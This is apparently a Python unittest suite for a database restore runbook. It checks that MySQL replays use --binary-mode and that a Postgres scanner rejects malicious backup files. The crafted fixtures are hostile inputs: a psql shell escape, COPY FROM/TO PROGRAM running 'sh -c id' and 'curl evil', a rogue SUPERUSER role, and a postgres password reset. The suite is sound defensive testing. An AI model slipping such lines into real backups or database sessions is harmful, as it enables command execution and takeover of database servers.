"""Fences on the database restore runbook (clusters/hetzner/data/RESTORE.md).

The runbook replays backup files through `mysql` and `psql`, which run client meta-commands (`\\!`,
`system`) and, for Postgres, `COPY ... FROM/TO PROGRAM` as superuser. A set is written by the same
identity as its manifest, so the checksum proves the copy, not the author (DATA-04): a restore must not
let backup content run commands (DATA-01). These fences assert the runbook keeps those guards and that
the Postgres scanner it ships actually refuses crafted files.

Stdlib only so CI needs no installs: `python3 -m unittest discover -s tests`.
"""
import pathlib
import re
import shutil
import subprocess
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parent.parent
RESTORE = ROOT / "clusters" / "hetzner" / "data" / "RESTORE.md"

# A shell command ends at a pipe, &&/||, a semicolon or a newline; we read each client invocation up to
# the next such boundary to see which flags it carries.
_BOUNDARY = re.compile(r"\||&&|\|\||;|\n")


def _segment_after(text, start):
    """The command text from `start` up to the next pipeline/command boundary."""
    end = len(text)
    m = _BOUNDARY.search(text, start)
    if m:
        end = m.start()
    return text[start:end]


class TestRestoreRunbook(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.text = RESTORE.read_text()

    # ---- DATA-01: MySQL replays run with --binary-mode -------------------------------------------

    def test_every_mysql_invocation_uses_binary_mode(self):
        # `mysql` followed by a real flag (`-u`, `--binary-mode`) is the client invocation. This skips
        # `mysqldump`/`mysqladmin` (a letter follows), `MYSQL_*` env vars (uppercase), names like
        # `tbd-mysql-backups` (no space), and the `kubectl exec mysql -- <cmd>` separator (`--` then a
        # space, not a flag). Every client call must disable meta-command interpretation.
        found = 0
        for m in re.finditer(r"\bmysql\s+-{1,2}[a-z]", self.text):
            seg = _segment_after(self.text, m.start())
            found += 1
            self.assertIn(
                "--binary-mode", seg,
                msg=f"mysql client invocation without --binary-mode: {seg.strip()!r}",
            )
        self.assertGreaterEqual(found, 3, "expected the mysql replay commands to be present")

    # ---- DATA-01: every psql replay of a backup file is preceded by the scan ---------------------

    def _scan_invocation_index(self):
        m = re.search(r"awk -f /tmp/scan\.awk", self.text)
        self.assertIsNotNone(m, "RESTORE.md does not run the Postgres scanner (awk -f /tmp/scan.awk)")
        return m.start()

    def test_psql_backup_replays_are_preceded_by_the_scan(self):
        # A replay feeds a gunzipped backup file into psql.
        replays = [
            m.start() for m in re.finditer(
                r"gzip -dc[^\n|]*?/tmp/(?:dump|grants)\.sql\.gz[^\n]*?\|\s*psql", self.text)
        ]
        self.assertGreaterEqual(len(replays), 2, "expected the two Postgres replays (grants and dump)")
        scan_at = self._scan_invocation_index()
        for pos in replays:
            self.assertLess(
                scan_at, pos,
                msg="a psql replay of a backup file is not preceded by the scan step",
            )

    def test_scan_covers_both_backup_files(self):
        # The loop that runs the scanner must cover both the grants and the dump file.
        self.assertRegex(self.text, r"for k in grants dump")

    # ---- DATA-04: the runbook states the checksum proves transport, not authorship ---------------

    def test_runbook_notes_checksum_proves_copy_not_author(self):
        self.assertRegex(self.text, r"(?i)proves the (file is the )?copy[^\n]*not who wrote it|not who wrote it")

    # ---- The scanner itself: extract it and run it against fixtures -------------------------------

    def _extract_scanner(self):
        m = re.search(r"# BEGIN pg-restore-scan.*?\n(.*?)\n# END pg-restore-scan", self.text, re.S)
        self.assertIsNotNone(m, "pg-restore-scan markers not found in RESTORE.md")
        # Include the END marker's own line content is harmless (awk comment); keep the body plus markers.
        return self.text[m.start():m.end()]

    def _run_scan(self, awk_bin, program_path, fixture):
        return subprocess.run(
            [awk_bin, "-f", str(program_path)],
            input=fixture, capture_output=True, text=True,
        ).returncode

    # pg_dump --create: SET lines, the \connect/\restrict meta-commands 18 emits, and a COPY data block.
    CLEAN_DUMP = (
        "--\n-- PostgreSQL database dump\n--\n"
        "\\restrict abc123\n"
        "SET statement_timeout = 0;\n"
        "SET client_encoding = 'UTF8';\n"
        "\\connect ziftbook\n"
        "CREATE TABLE public.clients (id bigint, name text);\n"
        "COPY public.clients (id, name) FROM stdin;\n"
        "1\tAna\n2\tBo\n"
        "\\.\n"
        "\\unrestrict abc123\n"
    )
    # COPY rows that legitimately start with a backslash (\N null, escaped \\x bytea, an escaped \\.),
    # and a data value that merely mentions the dangerous tokens: all opaque data, must pass.
    CLEAN_DUMP_BACKSLASH_ROWS = (
        "COPY public.raw (line, n) FROM stdin;\n"
        "\\N\t1\n"
        "\\\\x5c2e0a\t2\n"
        "\\\\. inside a value\t3\n"
        "FROM PROGRAM and SUPERUSER and ALTER ROLE postgres in data\t4\n"
        "\\.\n"
    )
    # pg_dumpall --globals-only: the one privileged line restores the postgres role; others are NOSUPERUSER.
    CLEAN_GLOBALS = (
        "\\restrict k\n"
        "CREATE ROLE postgres;\n"
        "ALTER ROLE postgres WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION BYPASSRLS PASSWORD 'md5x';\n"
        "CREATE ROLE ziftbook_app;\n"
        "ALTER ROLE ziftbook_app WITH NOSUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'md5y';\n"
        "GRANT ziftbook_app TO ziftbook_worker WITH INHERIT TRUE GRANTED BY postgres;\n"
        "\\unrestrict k\n"
    )

    def _crafted(self):
        return {
            "shell meta-command": self.CLEAN_DUMP + "\\! touch /tmp/pwned\n",
            "system-style meta-command": self.CLEAN_DUMP + "\\connecting evil\n",
            "COPY FROM PROGRAM": self.CLEAN_DUMP + "COPY public.x (c) FROM PROGRAM 'sh -c id';\n",
            "COPY TO PROGRAM": self.CLEAN_DUMP + "COPY public.x (c) TO PROGRAM 'curl evil';\n",
            "new SUPERUSER role": self.CLEAN_GLOBALS + "CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x';\n",
            "re-password postgres": self.CLEAN_GLOBALS + "ALTER ROLE postgres PASSWORD 'attacker';\n",
        }

    def test_scanner_passes_clean_and_refuses_crafted(self):
        awk_bin = shutil.which("awk")
        if awk_bin is None:
            self.skipTest("awk not available")
        scanner = self._extract_scanner()
        with tempfile.NamedTemporaryFile("w", suffix=".awk", delete=False) as fh:
            fh.write(scanner)
            prog = pathlib.Path(fh.name)
        try:
            clean = {
                "clean pg_dump": self.CLEAN_DUMP,
                "clean pg_dump with backslash COPY rows": self.CLEAN_DUMP + self.CLEAN_DUMP_BACKSLASH_ROWS,
                "clean pg_dumpall --globals-only": self.CLEAN_GLOBALS,
            }
            for name, fixture in clean.items():
                self.assertEqual(
                    0, self._run_scan(awk_bin, prog, fixture),
                    msg=f"scanner refused a clean file: {name}")
            for name, fixture in self._crafted().items():
                self.assertNotEqual(
                    0, self._run_scan(awk_bin, prog, fixture),
                    msg=f"scanner accepted a crafted file: {name}")
        finally:
            prog.unlink()


if __name__ == "__main__":
    unittest.main()
